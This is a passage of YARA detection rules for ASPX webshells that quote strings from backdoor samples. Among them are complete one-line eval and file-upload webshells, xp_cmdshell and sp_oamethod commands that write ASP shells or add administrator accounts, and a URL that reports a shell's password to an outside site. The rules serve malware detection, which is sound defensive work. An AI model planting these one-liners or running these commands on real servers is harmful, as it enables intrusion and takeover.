        $s13 = "<asp:Literal ID=\"Literal1\" runat=\"server\"></asp:Literal></td>" fullword ascii
        $s14 = "output.Append(\"<table width=\\\"100%\\\" border=\\\"1\\\">\");" fullword ascii
        $s15 = "sqlConnection.Dispose();" fullword ascii
        $s16 = "int colCount = sqlDataReader.FieldCount;" fullword ascii
        $s17 = "sqlConnection.Open();" fullword ascii
        $s18 = "SqlDataReader sqlDataReader = null;" fullword ascii
        $s19 = "SqlConnection sqlConnection = null;" fullword ascii
        $s20 = "sqlConnection = new SqlConnection();" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 8KB and ( 8 of them ) ) or ( all of them )
}

rule sig_355c35e602e694b99b7094916b7e6d8dd664e931
{
    meta:
        description = "aspx - file 355c35e602e694b99b7094916b7e6d8dd664e931.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "67db101a6c6b1b1bf58183ca513025048dc719ae4cbdba408092f0df296f9a67"
    strings:
        $x1 = "File.SetAttributes(path, File.GetAttributes(path) - FileAttributes.System)" fullword ascii
        $s2 = "response.Write(\"<script>alert('File info have add the cutboard, go to target directory click plaste!')</sc\"&\"ript>\")" fullword ascii
        $s3 = "myProcessStartInfo.UseShellExecute = False" fullword ascii
        $s4 = "db_cmd.ExecuteNonQuery()" fullword ascii
        $s5 = "File.SetAttributes(path, File.GetAttributes(path) - FileAttributes.ReadOnly)" fullword ascii
        $s6 = "response.addHeader(\"Content-Disposition\", \"attachment; filename=\" & replace(server.UrlEncode(path.getfilename(thePath" fullword ascii
        $s7 = "rk = Registry.Users.OpenSubKey( Right(hu , Len(hu) - Instr( hu,\"\\\" )) , 0 )" fullword ascii
        $s8 = "myProcessStartInfo.Arguments = CMDCommand.text" fullword ascii
        $s9 = "<asp:HyperLink id=\"HyperLink1\" runat=\"server\" Visible=\"True\" Target=\"_blank\" NavigateUrl=\"http://canglangjidi.qyun.n" fullword ascii
        $s10 = "recResult = adoConn.Execute(strQuery)" fullword ascii
        $s11 = "<asp:Label id=\"DB_exe\" runat=\"server\" height=\"37px\" visible=\"False\">Execute SQL :</asp:Label>" fullword ascii
        $s12 = "<asp:TextBox class=\"TextBox\" id=\"CMDPath\" runat=\"server\" Wrap=\"False\" Text=\"cmd.exe\" Width=\"250px\">c:\\windows\\syst" ascii
        $s13 = "<asp:TextBox class=\"TextBox\" id=\"CMDPath\" runat=\"server\" Wrap=\"False\" Text=\"cmd.exe\" Width=\"250px\">c:\\windows\\syst" ascii
        $s14 = "File.SetAttributes(path, File.GetAttributes(path) - FileAttributes.Archive)" fullword ascii
        $s15 = "File.SetAttributes(path, File.GetAttributes(path) - FileAttributes.Hidden)" fullword ascii
        $s16 = "DataCStr.Text = \"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\\MyWeb\\UpdateWebadmin\\guestbook.mdb\"" fullword ascii
        $s17 = "File.SetAttributes(path, File.GetAttributes(path) Or FileAttributes.System)" fullword ascii
        $s18 = "directory.createdirectory(temp & Path.GetFileName(mid(tmp, 1, len(tmp)-1)))" fullword ascii
        $s19 = "32\\cmd.exe</asp:TextBox>" fullword ascii
        $s20 = "rk = Registry.CurrentConfig.OpenSubKey( Right(hu , Len(hu) - Instr( hu,\"\\\" )) , 0 )" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule da522699ab1e40bbf34cfd4640e74350b9ae431e
{
    meta:
        description = "aspx - file da522699ab1e40bbf34cfd4640e74350b9ae431e.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b65b55f0dac5b1f20d1f1260f3f98bae607a37447c435391b18c1977c8eca2ee"
    strings:
        $x1 = "string select = \"<input type=hidden name=goaction><input type=hidden name=todo><input type=hidden name=intext><select onchange=" ascii
        $x2 = "<asp:TextBox ID=\"Bin_SucmdTextBox\" runat=\"server\" Width=\"447px\">cmd.exe /c net user</asp:TextBox><br />" fullword ascii
        $x3 = "@s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^> > c:\\\\1.asp';\\\">SP_oamethod exec<option value=\\\"sp_make" ascii
        $x4 = "Copyright (C) 2009 Bin -> <a href=\"http://www.zhack.cn\" target=\"_blank\">WwW.Zhack.Cn</a></asp:Panel><asp:Panel ID=\"B" fullword ascii
        $x5 = "string newdomain = \"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:" ascii
        $x6 = "CmdPath : &nbsp;<asp:TextBox ID=\"Bin_CmdPathTextBox\" runat=\"server\" Width=\"395px\">C:\\Windows\\System32\\Cmd.ex" fullword ascii
        $s7 = "string newdomain = \"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:" ascii
        $s8 = "iisinfo += \"<TD><a href=javascript:Command('change','\" + formatpath(newdir1.Properties[\"Path\"].Value.ToStrin" fullword ascii
        $s9 = "Bin_Filelist += \"<i><b><a href=javascript:Command('change','\" + parstr + \"');>|Parent Directory|</a></b></i>\";" fullword ascii
        $s10 = "tmpstr += \"<td><a href=javascript:Command('change','\" + foldername + \"')>\" + Bin_folder.Name + \"</a></td><td><b>" fullword ascii
        $s11 = "file += \"<a href=javascript:Command('change','\" + formatpath(drivers[i]) + \"');>\" + drivers[i] + \"</a>&nbsp;\";" fullword ascii
        $s12 = "<asp:Button ID=\"Bin_SAexecButton\" runat=\"server\" Text=\"SA_Exec\" OnClick=\"Bin_SAexecButton_Click\" /><br />" fullword ascii
        $s13 = "and('showatt','\" + filename + \"');>Att</a>|<a href=javascript:Command('del','\" + filename + \"');>Del</a></td>\";" fullword ascii
        $s14 = "<asp:Label ID=\"Bin_ErrorLabel\" runat=\"server\" EnableViewState=\"False\">Copyright (C) 2009 Bin -> <a href=\"http://www." fullword ascii
        $s15 = "sk @outputfile='d:\\\\web\\\\bin.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)))\" + \"%\" + \">''' \\\">SP_ma" ascii
        $s16 = "<asp:Button ID=\"Bin_SACMDButton\" runat=\"server\" Text=\"SA_Exec\" OnClick=\"Bin_SACMDButton_Click\" />" fullword ascii
        $s17 = "<asp:Button ID=\"Bin_LogshellButton\" runat=\"server\" Text=\"Bak_LOG\" OnClick=\"Bin_LogshellButton_Click\" /><hr /></a" fullword ascii
        $s18 = "Bin_SQLconnTextBox.Text = @\"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\\wwwroot\\database.mdb\";" fullword ascii
        $s19 = "<asp:Button ID=\"Bin_ExecButton\" runat=\"server\" OnClick=\"Bin_ExecButton_Click\" Text=\"Exec\" />" fullword ascii
        $s20 = "InfoLabel.Text += Bin_Process() + \"<hr>\";" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule ffdbcf9a42c4edc08e5cd0a2f7d915ce838683dc
{
    meta:
        description = "aspx - file ffdbcf9a42c4edc08e5cd0a2f7d915ce838683dc.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6e5b606bb919b0c9cdf98383aaa5e4d606db87e254251dc3ca7498b918900969"
    strings:
        $x1 = "Copyright &copy; 2009 Bin --  ROOT Shell Devoloper <a href=\"http://www.dcvi.net\" target=\"_blank\">www.dcvi.net</a>" fullword ascii
        $x2 = "href=\"http://www.rootkit.net.cn\" target=\"_blank\">Bin'Blog</a> All Rights Reserved.</div></div>" fullword ascii
        $s3 = "<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\">Copyright &copy; 2006-2009 <" ascii
        $s4 = "Bin_Button_KillMe.Attributes[\"onClick\"]=\"if(confirm('Are you sure delete ASPXSPY?')){Bin_PostBack('hae','');};\";" fullword ascii
        $s5 = "<td ><span style=\"float:right;\"><a href=\"http://www.rootkit.net.cn\" target=\"_blank\">ASPXSpy Ver: 2009</a></span><span id=" ascii
        $s6 = "<td ><span style=\"float:right;\"><a href=\"http://www.rootkit.net.cn\" target=\"_blank\">ASPXSpy Ver: 2009</a></span><span id=" ascii
        $s7 = "<title>ASPXspy - DCVI.NET</title>" fullword ascii
        $s8 = "public string Password=\"4d934e4cde0dce1d9b3ecaf84f5672b2\";//P@ssw0rd." fullword ascii
        $s9 = "Default password: admin" fullword ascii
        $s10 = "an_Sname\" runat=\"server\" enableviewstate=\"true\"></span></td>" fullword ascii
    condition:
        ( uint16(0) == 0x3c76 and filesize < 200KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule sig_4b365fc9ddc8b247a12f4648cd5c91ee65e33fae
{
    meta:
        description = "aspx - file 4b365fc9ddc8b247a12f4648cd5c91ee65e33fae.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "34bad999ee5dcdafa4cfa7c8d8c94fe837e70810686b338aea848e6772fd0656"
    strings:
        $s1 = "lblCmdOut.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();" fullword ascii
        $s2 = "p.StartInfo.FileName = \"cmd.exe\";" fullword ascii
        $s3 = "<asp:Button runat=\"server\" ID=\"cmdExec\" Text=\"Execute\" />" fullword ascii
        $s4 = "string fstr = string.Format(\"<a href='?get={0}' target='_blank'>{1}</a>\"," fullword ascii
        $s5 = "p.StartInfo.UseShellExecute = false;" fullword ascii
        $s6 = "HttpUtility.UrlEncode(dir + \"/\" + curfile.Name)," fullword ascii
        $s7 = "HttpUtility.UrlEncode(dir + \"/\" + curdir.Name)," fullword ascii
        $s8 = "HttpUtility.UrlEncode(dir + \"/\" + curfile.Name));" fullword ascii
        $s9 = "<asp:Button runat=\"server\" ID=\"cmdUpload\" Text=\"Upload\" />" fullword ascii
        $s10 = "if ((Request.QueryString[\"get\"] != null) && (Request.QueryString[\"get\"].Length > 0))" fullword ascii
        $s11 = "HttpUtility.HtmlEncode(driveRoot));" fullword ascii
        $s12 = "HttpUtility.UrlEncode(driveRoot)," fullword ascii
        $s13 = "<%@ Import Namespace=\"System.Web.UI.WebControls\" %>" fullword ascii
        $s14 = "<b><asp:Literal runat=\"server\" ID=\"lblPath\" Mode=\"passThrough\" /></b>" fullword ascii
        $s15 = "<pre><asp:Literal runat=\"server\" ID=\"lblCmdOut\" Mode=\"Encode\" /></pre>" fullword ascii
        $s16 = "string driveRoot = curdrive.RootDirectory.Name.Replace(\"\\\\\", \"\");" fullword ascii
        $s17 = "Response.WriteFile(Request.QueryString[\"get\"]);" fullword ascii
        $s18 = "// exec cmd ?" fullword ascii
        $s19 = "<asp:Literal runat=\"server\" ID=\"lblDrives\" Mode=\"PassThrough\" />" fullword ascii
        $s20 = "<asp:Literal runat=\"server\" ID=\"lblDirOut\" Mode=\"PassThrough\" />" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 10KB and ( 8 of them ) ) or ( all of them )
}

rule sig_3db4b44135b638954a3d366902da23333ced3b87
{
    meta:
        description = "aspx - file 3db4b44135b638954a3d366902da23333ced3b87.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8d471c18d5306c15331e366d9595b6258fb51ea28ba13c288edb06c6a9c5a7f1"
    strings:
        $x1 = "<a href=\"http://hi.baidu.com/%CE%E9%D7%D3%C7%C7/home\" target=\"_blank\">" fullword ascii
        $x2 = "<td ><span style=\"float:right;\"><a href=\"http://www.nftsafe.com\" target=\"_blank\">" fullword ascii
        $s3 = "<td colspan=\"5\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\"input\" runat=\"server\" id=\"mHbjB\" type=\"text\" size=\"100\" val" ascii
        $s4 = "<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#003300;\">Copyright &copy; 2009-201" ascii
        $s5 = ".Bin_Style_Login{font-size: 12px; font-family:Tahoma;background-color:#ddd;border:1px solid #fff;}" fullword ascii
        $s6 = "GLpi.Text=\"<a href=\\\"#\\\" onclick=\\\"Bin_PostBack('ksGR','\"+MVVJ(AXSbb.Value+Bin_Files.Name)+\"')\\\">" fullword ascii
        $s7 = ": <asp:TextBox id=\"MasR\" style=\"width:70%;margin:0 8px;\" CssClass=\"input\" runat=\"server\"/><asp:DropDownList runat=\"serv" ascii
        $s8 = ".head td{border-top:1px solid #ddd;border-bottom:1px solid #ccc;background:#073b07;padding:5px 10px 5px 5px;font-weight:bold;}" fullword ascii
        $s9 = "</a> | <a href=\\\"#\\\" onclick=\\\"Bin_PostBack('Bin_Editfile','\"+Bin_Files.Name+\"')\\\">" fullword ascii
        $s10 = "\" OnClick=\"Ybg\"></asp:LinkButton> | <asp:LinkButton ID=\"xxzE\" runat=\"server\" Text=\"Cmd" fullword ascii
        $s11 = "IP : <asp:TextBox id=\"MdR\" style=\"width:10%;margin:0 8px;\" CssClass=\"input\" runat=\"server\" Text=\"127.0.0.1\"/> " fullword ascii
        $s12 = "\" OnClick=\"mcCY\"></asp:LinkButton> | <a href=\"#\" id=\"Bin_Button_CreateDir\" runat=\"server\">" fullword ascii
        $s13 = "</a> | <a href=\\\"#\\\" onclick=\\\"Bin_PostBack('cYAl','\"+Bin_Files.Name+\"')\\\">" fullword ascii
        $s14 = "public string Password=\"571df1818893b45ad4fd9697b55b3679\";//" fullword ascii
        $s15 = ") ?')){Bin_PostBack('kRXgt','\"+MVVJ(AXSbb.Value+Bin_folder.Name)+\"')};\\\">" fullword ascii
        $s16 = "Ip : <input class=\"input\" runat=\"server\" id=\"eEpm\" type=\"text\" size=\"20\" value=\"127.0.0.1\"/></td>" fullword ascii
        $s17 = "</a></span><span id=\"Bin_Span_Sname\" runat=\"server\" enableviewstate=\"true\"></span></td>" fullword ascii
        $s18 = "<td style=\"width:20%\" align=\"left\"><input type=\"checkbox\" runat=\"server\" id=\"rAQ\" value=\"1\"/> " fullword ascii
        $s19 = ": <input class=\"input\" runat=\"server\" id=\"dNohJ\" type=\"text\" size=\"20\" value=\"localadministrator\"/></td>" fullword ascii
        $s20 = "\" OnClick=\"PPtK\"></asp:LinkButton> | <asp:LinkButton ID=\"PVQ\" runat=\"server\" Text=\"Serv-U" fullword ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule a91320483df0178eb3cafea830c1bd94585fc896
{
    meta:
        description = "aspx - file a91320483df0178eb3cafea830c1bd94585fc896.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b96628b36911fce4ffa18cc10ba36d1dbd260f638c18b60e73f484c09ef0be09"
    strings:
        $x1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"Bin_List_Exec\" AutoPostBack=\"True\" OnSelectedIndexChanged=\"Bin_List_Select" ascii
        $x2 = "OAMethod @s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^>>c:\\bin.asp';\">SP_oamethod exec</asp:ListItem><asp:" ascii
        $x3 = "ias.mdb','select shell(&#34;cmd.exe /c net user root root/add &#34;)')\">SandBox</asp:ListItem><asp:ListItem Value=\"create tabl" ascii
        $x4 = "Bin_ExecSql(\"EXEC master..xp_cmdshell 'echo \" + substrfrm + \" >> c:\\\\windows\\\\temp\\\\tmp.fmt'\");" fullword ascii
        $x5 = "ePath.Value + \"\\\" -T -f c:\\\\windows\\\\temp\\\\tmp.fmt'\");" fullword ascii
        $x6 = "\"http://www.rootkit.net.cn\" target=\"_blank\">Bin'Blog</a> All Rights Reserved.</div></div>" fullword ascii
        $x7 = "Bin_ExecSql(\"exec master..xp_cmdshell'bcp \\\"select safile from \" + db + \"..bin_temp\\\" queryout \\\"\" + Bin_TextBox_SaveP" ascii
        $x8 = "t:16px\" size=\"40\" value=\"c:\\windows\\system32\\sethc.exe\"/>&nbsp;&nbsp;&nbsp;&nbsp;<asp:Button runat=\"server\" " fullword ascii
        $x9 = "Bin_ExecSql(\"exec master..xp_cmdshell'bcp \\\"select safile from \" + db + \"..bin_temp\\\" queryout \\\"\" + Bin_TextBox_Sav" fullword ascii
        $x10 = "Bin_ExecSql(\"EXECUTE master..xp_cmdshell 'del c:\\\\windows\\\\temp\\\\tmp.fmt'\");" fullword ascii
        $x11 = "Response.AddHeader(\"Content-Disposition\",\"attachment;filename=\"+HttpUtility.UrlEncode(fi.Name,System.Text.Encoding.UTF8));" fullword ascii
        $x12 = "<asp:LinkButton ID=\"Bin_Button_Logout\" runat=\"server\" OnClick=\"Bin_Button_Logout_Click\" Text=\"Logout\" ></asp:LinkButton>" ascii
        $x13 = "foreach(ManagementObject p in Bin_WmiQuery(\"root\\\\CIMV2\",\"Select * from Win32_Process Where ProcessID ='\"+pid+\"'\"))" fullword ascii
        $x14 = "if(Bin_ExecSql(\"exec master..xp_makecab '\" + tmppath + \"\\\\~098611.tmp','default',1,'\" + Bin_TextBox_Source.Value + \"" fullword ascii
        $x15 = "return string.Format(\"<a href=\\\"javascript:Bin_PostBack('zcg_KillProcess','{0}')\\\">Kill</a>\",pid);" fullword ascii
        $s16 = "tc.Text=\"<a href=\\\"javascript:Bin_PostBack('zcg_ClosePM','\"+Bin_ToBase64(de.Key.ToString())+\"')\\\">Close</a>\";" fullword ascii
        $s17 = "<td style=\"width:20%\" align=\"left\">Target : <input id=\"Bin_TextBox_Target\" class=\"input\" runat=\"server\" type=\"text\" " ascii
        $s18 = "Bin_ExecSql(\"IF OBJECT_ID('bin_temp')IS NOT NULL DROP TABLE bin_temp\");" fullword ascii
        $s19 = "Bin_ExecSql(\"If object_id('bin_temp')is not null drop table bin_temp\");" fullword ascii
        $s20 = ".GetFileName(Bin_TextBox_Target.Value) + \"'\")){Bin_Msg(\"File Copyed,Good Luck!\");}" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule e4bf69bc3a00e9c371336de2a784f443fb79123f
{
    meta:
        description = "aspx - file e4bf69bc3a00e9c371336de2a784f443fb79123f.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c2680a9b5247c04c2f13887324143129cc273bb2ff7ae3acecc4e79d537ba4ac"
    strings:
        $s1 = "password\"],\"unsafe\");%>" fullword ascii
        $s2 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_1d101f90130382e9e11044d637ddc0141dd96895
{
    meta:
        description = "aspx - file 1d101f90130382e9e11044d637ddc0141dd96895.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "52aa547196619af32fb65bda20bf290aea2f298eef373020deb76d6f952c42fe"
    strings:
        $s1 = "SqlDataAdapter command = new SqlDataAdapter(SQL, connection);" fullword ascii
        $s2 = "<%@ import Namespace=\"System.Data.Common\"%>" fullword ascii
        $s3 = "string sConnStr = \"Driver={Sql Server};Server=192.168.1.5;Uid=mssql" fullword ascii
        $s4 = "command.Fill(ds, \"ds\");" fullword ascii
        $s5 = "Server.ScriptTimeout = 2147483647;" fullword ascii
        $s6 = "Response.Write(dt.Columns[j].ColumnName + \"\\t\");" fullword ascii
        $s7 = "Response.Write(dt.Rows[j][k] + \"\\t\");" fullword ascii
        $s8 = "Response.Write(dt.TableName + \"\\r\\n\");" fullword ascii
        $s9 = "using (SqlConnection connection = new SqlConnection(ConnStr))" fullword ascii
        $s10 = "for (int i = 0; i < ds.Tables.Count; i++ )" fullword ascii
        $s11 = "public static DataSet Query(string SQL, string ConnStr)" fullword ascii
        $s12 = "catch (System.Data.SqlClient.SqlException ex)" fullword ascii
        $s13 = "connection.Open();" fullword ascii
        $s14 = "string sSQL = \"SELECT * FROM [" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 6KB and ( 8 of them ) ) or ( all of them )
}

rule sig_51847150b3dd7ee8ac71bddad558325476d75c69
{
    meta:
        description = "aspx - file 51847150b3dd7ee8ac71bddad558325476d75c69.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2e8c7eacd739ca3f3dc4112b41a024157035096b8d0c26ba79d8b893136391bc"
    strings:
        $x1 = "Response.Write(Server.HtmlEncode(this.ExecuteCommand(txtCommand.Text)));" fullword ascii
        $x2 = "processStartInfo.FileName = \"cmd.exe\";" fullword ascii
        $s3 = "processStartInfo.Arguments = \"/c \" + command;" fullword ascii
        $s4 = "processStartInfo.UseShellExecute = false;" fullword ascii
        $s5 = "private string ExecuteCommand(string command)" fullword ascii
        $s6 = "<td><asp:Button ID=\"btnExecute\" runat=\"server\" OnClick=\"btnExecute_Click\" Text=\"Execute\" /></td>" fullword ascii
        $s7 = "<td><asp:TextBox ID=\"txtCommand\" runat=\"server\" Width=\"820px\"></asp:TextBox></td>" fullword ascii
        $s8 = "protected void btnExecute_Click(object sender, EventArgs e)" fullword ascii
        $s9 = "processStartInfo.RedirectStandardOutput = true;" fullword ascii
        $s10 = "ProcessStartInfo processStartInfo = new ProcessStartInfo();" fullword ascii
        $s11 = "using (StreamReader streamReader = process.StandardOutput)" fullword ascii
        $s12 = "<!-- Created by Mark Woan (http://www.woanware.co.uk) -->" fullword ascii
        $s13 = "Process process = Process.Start(processStartInfo);" fullword ascii
        $s14 = "<td><asp:TextBox id=\"txtAuthKey\" runat=\"server\"></asp:TextBox></td>" fullword ascii
        $s15 = "<form id=\"formCommand\" runat=\"server\">" fullword ascii
        $s16 = "private const string AUTHKEY = \"woanware\";" fullword ascii
        $s17 = "/// <param name=\"command\"></param>" fullword ascii
        $s18 = "<td width=\"30\">Command:</td>" fullword ascii
        $s19 = "<%@ Import namespace=\"System.Diagnostics\"%>" fullword ascii
        $s20 = "private const string HEADER = \"<html>\\n<head>\\n<title>command</title>\\n<style type=\\\"text/css\\\"><!--\\nbody,table,p,pre," ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 8KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule cb6eb7b3fb8d00cd893299f53353995394e9379b
{
    meta:
        description = "aspx - file cb6eb7b3fb8d00cd893299f53353995394e9379b.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "350062ce5c25e1ba1c5fbed77081ed88789bf79bbdab2301092a591eddaa665a"
    strings:
        $s1 = "list.Add(temp + \"\\\\\");" fullword ascii
        $s2 = "if (list.IndexOf(temp + \"\\\\\") == -1)" fullword ascii
        $s3 = "File.Create(temp + \"\\\\Test\").Close();" fullword ascii
        $s4 = "Response.Write(temp + \"<br/>\");" fullword ascii
        $s5 = "File.Delete(temp + \"\\\\test\");" fullword ascii
        $s6 = "FileAttributes dInfo = File.GetAttributes(temp);" fullword ascii
        $s7 = "while (temp.IndexOf(\"\\\\\") != -1)" fullword ascii
        $s8 = "list.Add(temp);" fullword ascii
        $s9 = "if (list.IndexOf(temp) == -1)" fullword ascii
        $s10 = "RegStack.Push(Registry.Users);" fullword ascii
        $s11 = "temp = temp.Substring(0, temp.LastIndexOf(\"\\\\\"));" fullword ascii
        $s12 = "Regex regImg = new Regex(\"[a-z|A-Z]{1}:\\\\\\\\[a-z|A-Z| |0-9|\\u4e00-\\u9fa5|\\\\~|\\\\\\\\|_|{|}|\\\\.]*\");" fullword ascii
        $s13 = "string[] keys = Hklm.GetSubKeyNames();" fullword ascii
        $s14 = "<%@ import Namespace=\"System.Collections.Generic\"%>" fullword ascii
        $s15 = "RegistryKey Hklm = (RegistryKey)RegStack.Pop();" fullword ascii
        $s16 = "string str = Hklm.GetValue(name).ToString().ToLower();" fullword ascii
        $s17 = "<%@ import Namespace=\"System.Threading\"%>" fullword ascii
        $s18 = "if (!temp.EndsWith(\"\\\\\"))" fullword ascii
        $s19 = "RegStack.Push(Registry.CurrentConfig);" fullword ascii
        $s20 = "RegStack.Push(Hklm.OpenSubKey(key));" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 20KB and ( 8 of them ) ) or ( all of them )
}

rule sig_4e16153a38f697c00aeed0855ef83dc8305efb48
{
    meta:
        description = "aspx - file 4e16153a38f697c00aeed0855ef83dc8305efb48.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d84c03b9a4a16f391ffa241b8e4f0e72678a452dcc302af1f3947c7671b17410"
    strings:
        $s1 = "<%if (Request.Files.Count!=0) { Request.Files[0].SaveAs(Server.MapPath(Request[\"f\"]) ); }%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule b789f8cffef6ba3b391cd725d057f1bd580e2367
{
    meta:
        description = "aspx - file b789f8cffef6ba3b391cd725d057f1bd580e2367.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "53bbd2c7a54e1d98f5679809860e424365be07feb962074f57a1a084ba3933ad"
    strings:
        $x1 = "response.Append(\"<tr><td>file&nbsp;<a href=\\\"?file=\" + fileInfo.FullName + \"&operation=download\\\">\" + fileInfo.F" fullword ascii
        $s2 = "response.Append(\"<tr><td>dir&nbsp;&nbsp;<a href=\\\"?directory=\" + dirs.FullName + \"&operation=list\\\">\" + dirs.Ful" fullword ascii
        $s3 = "Response.AddHeader(\"Content-Disposition\", \"attachment; filename=\" + Path.GetFileName(file));" fullword ascii
        $s4 = "Response.AddHeader(\"Content-Length\", new FileInfo(file).Length.ToString());" fullword ascii
        $s5 = "string[] tempDrives = Environment.GetLogicalDrives();" fullword ascii
        $s6 = "response.Append(\"<tr><td>file&nbsp;<a href=\\\"?file=\" + fileInfo.FullName + \"&operation=download\\\">\" + fileInfo.FullName " ascii
        $s7 = "foreach (System.IO.DirectoryInfo dirs in dirInfo.GetDirectories(\"*.*\"))" fullword ascii
        $s8 = "if (Request.Params[\"operation\"] == \"download\")" fullword ascii
        $s9 = "<!-- Created by Mark Woan (http://www.woany.co.uk) -->" fullword ascii
        $s10 = "foreach (System.IO.FileInfo fileInfo in dirInfo.GetFiles(\"*.*\"))" fullword ascii
        $s11 = "for (int index = 0; index < tempDrives.Length; index++)" fullword ascii
        $s12 = "Response.Write(this.DownloadFile());" fullword ascii
        $s13 = "private const string HEADER = \"<html>\\n<head>\\n<title>filesystembrowser</title>\\n<style type=\\\"text/css\\\"><!--\\nbody,ta" ascii
        $s14 = "response.Append(\"&operation=list\\\">\");" fullword ascii
        $s15 = "string[] drives = Environment.GetLogicalDrives();" fullword ascii
        $s16 = "private string DownloadFile()" fullword ascii
        $s17 = "response.Append(\"&operation=list>\");" fullword ascii
        $s18 = "Response.Write(\"Unknown operation\");" fullword ascii
        $s19 = "response.Append(\"<tr><td>dir&nbsp;&nbsp;<a href=\\\"?directory=\" + dirs.FullName + \"&operation=list\\\">\" + dirs.FullName + " ascii
        $s20 = "else if (Request.Params[\"operation\"] == \"list\")" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 20KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_8f8b5684a19aea5f7f36aaa5a3986ee0e6c335ed
{
    meta:
        description = "aspx - file 8f8b5684a19aea5f7f36aaa5a3986ee0e6c335ed.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "534d12698f5b5021f56e7e5ae5f601a73a85f297932967f375391d7ad59f759a"
    strings:
        $s1 = "ms.ExecuteStatement(\"ev\"&\"al(request(\"\"8090sec\"\"))\")" fullword ascii
        $s2 = "set ms = server.CreateObject(\"MSScriptControl.ScriptControl.1\")" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule d7c4ab802572ec0a4bd029b736251ec76344ac7a
{
    meta:
        description = "aspx - file d7c4ab802572ec0a4bd029b736251ec76344ac7a.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c5d0c5851f404a27a261f098d69a86807b93e255879d736ba0fb2c96250661e6"
    strings:
        $x1 = "string s = \"http://gz1949.com/so.php?user=\" + Password + \"&url=\" +HttpContext.Current.Request.Url.ToString();" fullword ascii
        $s2 = "<td colspan=\"5\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\"input\" runat=\"server\" id=\"mHbjB\" type=\"text\" size=\"100\" val" ascii
        $s3 = "<td ><span style=\"float:right;\"><a href=\"www.gz1949.com\" target=\"_blank\">" fullword ascii
        $s4 = ".Bin_Style_Login{font-size: 12px; font-family:Tahoma;background-color:#ddd;border:1px solid #fff;}" fullword ascii
        $s5 = "<a href=\"http://www.on-e.cn\" target=\"_blank\">ON-e.cn</a> All Rights Reserved.</div></div>" fullword ascii
        $s6 = "GLpi.Text=\"<a href=\\\"#\\\" onclick=\\\"Bin_PostBack('ksGR','\"+MVVJ(AXSbb.Value+Bin_Files.Name)+\"')\\\">" fullword ascii
        $s7 = ": <asp:TextBox id=\"MasR\" style=\"width:70%;margin:0 8px;\" CssClass=\"input\" runat=\"server\"/><asp:DropDownList runat=\"serv" ascii
        $s8 = ".head td{border-top:1px solid #ddd;border-bottom:1px solid #ccc;background:#073b07;padding:5px 10px 5px 5px;font-weight:bold;}" fullword ascii
